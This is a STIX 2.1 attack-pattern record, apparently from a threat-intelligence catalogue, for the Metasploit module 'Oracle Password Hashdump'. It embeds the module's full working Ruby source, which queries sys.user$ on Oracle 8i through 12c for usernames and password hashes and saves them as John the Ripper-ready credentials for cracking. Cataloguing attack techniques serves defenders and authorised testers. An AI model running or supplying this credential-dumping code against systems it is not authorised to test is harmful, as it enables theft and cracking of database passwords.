{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3744e568-a5f7-4730-885b-d621f4c67ba8",
    "created": "2024-08-14T16:27:56.008167Z",
    "modified": "2024-08-14T16:27:56.008171Z",
    "name": "Oracle Password Hashdump",
    "description": "Q This module dumps the usernames and password hashes from Oracle given the proper Credentials and SID. These are then stored as creds for later cracking using auxiliary/analyze/jtr_oracle_fast. This module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/oracle/oracle_hashdump.rb",
            "external_id": "oracle_hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Oracle Password Hashdump',\n      'Description'    => %Q{\n          This module dumps the usernames and password hashes\n          from Oracle given the proper Credentials and SID.\n          These are then stored as creds for later cracking using auxiliary/analyze/jtr_oracle_fast.\n          This module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c.\n      },\n      'Author'         => ['theLightCosine'],\n      'License'        => MSF_LICENSE\n    )\n  end\n\n  def run_host(ip)\n    return if not check_dependencies\n\n    # Checks for Version of Oracle. Behavior varies with oracle version.\n    # 12c uses SHA-512 (explained in more detail in report_hashes() below)\n    # 11g uses SHA-1 while 8i-10g use DES\n    query =  'select * from v$version'\n    ver = prepare_exec(query)\n\n    if ver.nil?\n      print_error(\"An error has occurred while querying for the Oracle version. Please check your OPTIONS\")\n      return\n    end\n\n    unless ver.empty?\n      case\n      when ver[0].include?('8i')\n        ver='8i'\n      when ver[0].include?('9i')\n        ver='9i'\n      when ver[0].include?('10g')\n        ver='10g'\n      when ver[0].include?('11g')\n        ver='11g'\n      when ver[0].include?('12c')\n        ver='12c'\n      when ver[0].include?('18c')\n        print_error(\"Version 18c is not currently supported\")\n        return\n      else\n        print_error(\"Error: Oracle DB version not supported.\\nThis module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c.\\nDumping unsupported version info:\\n#{ver[0]}\")\n        return\n      end\n      vprint_status(\"Server is running version #{ver}\")\n    end\n\n    this_service = report_service(\n          :host  => datastore['RHOST'],\n          :port => datastore['RPORT'],\n          :name => 'oracle',\n          :proto => 'tcp'\n          )\n\n    tbl = Rex::Text::Table.new(\n      'Header'  => 'Oracle Server Hashes',\n      'Indent'   => 1,\n      'Columns' => ['Username', 'Hash']\n    )\n\n    begin\n      case ver\n      when '8i', '9i', '10g'    # Get the usernames and hashes for 8i-10g\n        query='SELECT name, password FROM sys.user$ where password is not null and name<> \\'ANONYMOUS\\''\n        results= prepare_exec(query)\n        unless results.empty?\n          results.each do |result|\n            row= result.split(/,/)\n            tbl << row\n          end\n        end\n      when '11g', '12c'    # Get the usernames and hashes for 11g or 12c\n        query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \\'ANONYMOUS\\''\n        results= prepare_exec(query)\n        #print_status(\"Results: #{results.inspect}\")\n        unless results.empty?\n          results.each do |result|\n            row= result.split(/,/)\n            next unless row.length == 2\n            tbl << row\n          end\n        end\n      end\n    rescue => e\n      print_error(\"An error occurred. The supplied credentials may not have proper privileges\")\n      return\n    end\n    print_status(\"Hash table :\\n #{tbl}\")\n    report_hashes(tbl, ver, ip, this_service)\n  end\n\n  # Save each row in the hash table as credentials (shown by \"creds\" command)\n  # This is done slightly differently, depending on the version\n  def report_hashes(table, ver, ip, service)\n\n    # Before module jtr_oracle_fast cracks these hashes, they are converted (based on jtr_format)\n    # to a format that John The Ripper can handle. This format is stored here.\n    case ver\n    when '8i', '10g'\n      jtr_format = \"des,oracle\"\n    when '11g'\n      jtr_format = \"raw-sha1,oracle11\"\n    when '12c'\n      jtr_format = \"oracle12c\"\n    end\n\n    service_data = {\n      address: Rex::Socket.getaddress(ip),\n      port: service[:port],\n      protocol: service[:proto],\n      service_name: service[:name],\n      workspace_id: myworkspace_id\n    }\n\n    # For each row in the hash table, save its corresponding credential data and JTR format\n    table.rows.each do |row|\n      credential_data = {\n        origin_type: :service,\n        module_fullname: self.fullname,\n        username: row[0],\n        private_data: row[1],\n        private_type: :nonreplayable_hash,\n        jtr_format: jtr_format\n      }\n\n      credential_core = create_credential(credential_data.merge(service_data))\n\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      create_credential_login(login_data.merge(service_data))\n    end\n    print_good(\"Hash Table has been saved\")\n  end\n\nend\n"
}